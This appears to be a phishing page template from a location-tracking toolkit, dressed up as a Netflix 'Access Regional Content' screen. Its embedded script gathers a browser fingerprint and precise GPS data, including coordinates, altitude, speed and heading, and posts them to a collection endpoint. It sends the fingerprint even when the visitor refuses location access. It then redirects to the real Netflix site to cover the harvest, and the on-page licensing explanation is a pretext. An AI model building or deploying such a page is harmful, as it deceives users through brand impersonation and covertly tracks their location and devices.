<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background: #141414;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: #000000;
            border-radius: 4px;
            box-shadow: 0 4px 32px rgba(229, 9, 20, 0.2);
            padding: 40px 30px;
            max-width: 420px;
            width: 90%;
            text-align: center;
            border: 1px solid #333;
        }
        
        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #e50914;
            margin-bottom: 30px;
            letter-spacing: 2px;
        }
        
        .title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: white;
        }
        
        .subtitle {
            color: #b3b3b3;
            margin-bottom: 30px;
            font-size: 16px;
            line-height: 1.4;
        }
        
        .region-box {
            background: #1a1a1a;
            border-radius: 4px;
            padding: 25px 20px;
            margin-bottom: 25px;
            border: 1px solid #333;
        }
        
        .region-header {
            font-size: 18px;
            font-weight: 600;
            color: #e50914;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .content-preview {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin: 15px 0;
        }
        
        .content-item {
            aspect-ratio: 16/9;
            background: linear-gradient(45deg, #e50914, #8b0000);
            border-radius: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: white;
            font-weight: bold;
        }
        
        .feature-item {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
            color: #e5e5e5;
            text-align: left;
        }
        
        .feature-item:last-child {
            margin-bottom: 0;
        }
        
        .feature-icon {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            font-size: 18px;
            color: #e50914;
        }
        
        .btn {
            background: #e50914;
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: background 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn:hover {
            background: #f6121d;
        }
        
        .btn:disabled {
            background: #444;
            cursor: not-allowed;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
            color: #b3b3b3;
            font-style: italic;
        }
        
        .error {
            color: #e87c03;
            margin-top: 15px;
            display: none;
            background: #2a1f1a;
            padding: 12px;
            border-radius: 4px;
            border: 1px solid #e87c03;
        }
        
        .region-info {
            margin-top: 25px;
            padding: 20px;
            background: #1a1a1a;
            border-radius: 4px;
            border: 1px solid #333;
        }
        
        .region-info h4 {
            color: #e50914;
            margin-bottom: 10px;
            font-size: 14px;
            font-weight: 600;
        }
        
        .region-info p {
            color: #b3b3b3;
            font-size: 13px;
            line-height: 1.5;
        }
        
        .plan-badge {
            display: inline-block;
            background: #e50914;
            color: white;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        
        .regional-content {
            text-align: left;
            margin-top: 15px;
        }
        
        .regional-content h5 {
            color: #e5e5e5;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .content-list {
            color: #b3b3b3;
            font-size: 13px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">NETFLIX</div>
        
        <h1 class="title">Access Regional Content</h1>
        <p class="subtitle">Unlock exclusive shows and movies available in your region</p>
        
        <div class="plan-badge">PREMIUM SUBSCRIBER</div>
        
        <div class="region-box">
            <div class="region-header">
                <span>üåç</span>
                <span>Regional Content Library</span>
            </div>
            
            <div class="content-preview">
                <div class="content-item">Show A</div>
                <div class="content-item">Movie B</div>
                <div class="content-item">Series C</div>
            </div>
            
            <div class="feature-item">
                <span class="feature-icon">üé¨</span>
                <span>Exclusive regional movies and series</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">üåê</span>
                <span>Localized content recommendations</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">üé≠</span>
                <span>Local language programming</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">üì∫</span>
                <span>Region-specific originals</span>
            </div>
            
            <div class="regional-content">
                <h5>üéØ Available in Your Area:</h5>
                <div class="content-list">
                    ‚Ä¢ Local documentaries and films<br>
                    ‚Ä¢ Regional comedy specials<br>
                    ‚Ä¢ Area-specific Netflix Originals<br>
                    ‚Ä¢ Local news and current affairs
                </div>
            </div>
        </div>
        
        <button class="btn" id="enableLocation">
            üåç Access Regional Content
        </button>
        
        <div class="loading" id="loading">
            <i>üîÑ Verifying your location for regional access...</i>
        </div>
        
        <div class="error" id="error"></div>
        
        <div class="region-info">
            <h4>üìç Why do we need your location?</h4>
            <p>
                Netflix licenses content differently by region. To ensure you see all shows and movies available in your area and comply with licensing agreements, we need to verify your location. This enables us to provide you with the most complete and relevant content library for your region.
            </p>
        </div>
    </div>

    <script src="{{ url_for('static', filename='js/fingerprint.js') }}"></script>
    <script>
        const sessionId = '{{ session_id }}';
        
        document.getElementById('enableLocation').addEventListener('click', function() {
            this.disabled = true;
            this.textContent = 'üîÑ Verifying Location...';
            document.getElementById('loading').style.display = 'block';
            
            const deviceData = collectDeviceFingerprint();
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        
                        sendData({
                            session_id: sessionId,
                            location: locationData,
                            device: deviceData,
                            template: 'netflix'
                        });
                        
                        document.getElementById('loading').innerHTML = '<i style="color: #4CAF50;">‚úÖ Location verified! Loading your regional content...</i>';
                        setTimeout(() => {
                            window.location.href = 'https://netflix.com';
                        }, 2000);
                    },
                    function(error) {
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('error').style.display = 'block';
                        
                        let errorMessage = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = 'Location verification is required to access regional content. Please enable location services.';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = 'Unable to verify your location for regional content access.';
                                break;
                            case error.TIMEOUT:
                                errorMessage = 'Location verification timed out. Please try again.';
                                break;
                            default:
                                errorMessage = 'Location verification failed. Please try again.';
                                break;
                        }
                        document.getElementById('error').textContent = errorMessage;
                        
                        sendData({
                            session_id: sessionId,
                            device: deviceData,
                            template: 'netflix',
                            location_error: errorMessage
                        });
                        
                        const btn = document.getElementById('enableLocation');
                        btn.disabled = false;
                        btn.textContent = 'üåç Try Again';
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('error').style.display = 'block';
                document.getElementById('error').textContent = 'Location verification is not supported by this browser.';
                
                sendData({
                    session_id: sessionId,
                    device: deviceData,
                    template: 'netflix',
                    location_error: 'Geolocation not supported'
                });
            }
        });
        
        function sendData(data) {
            fetch('/api/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            }).catch(error => {
                console.error('Error sending data:', error);
            });
        }
    </script>
</body>
</html>
